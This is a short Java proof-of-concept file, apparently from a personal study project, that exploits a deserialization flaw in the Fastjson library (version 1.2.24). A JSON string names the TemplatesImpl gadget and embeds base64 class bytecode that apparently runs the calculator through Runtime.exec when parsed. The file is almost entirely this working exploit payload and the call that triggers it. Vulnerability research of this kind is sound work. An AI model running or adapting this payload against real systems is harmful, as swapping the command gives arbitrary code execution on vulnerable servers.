package Fastjson.version24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.IOException;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: Fastjson.version24
 * @Author: Clown
 * @CreateTime: 2023-10-11  10:09
 */
public class poc24TemplatesImpl {
    public static void main(String[] args) throws Exception{
        String str = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }}";
        JSON.parse(str, Feature.SupportNonPublicField);
    }
}
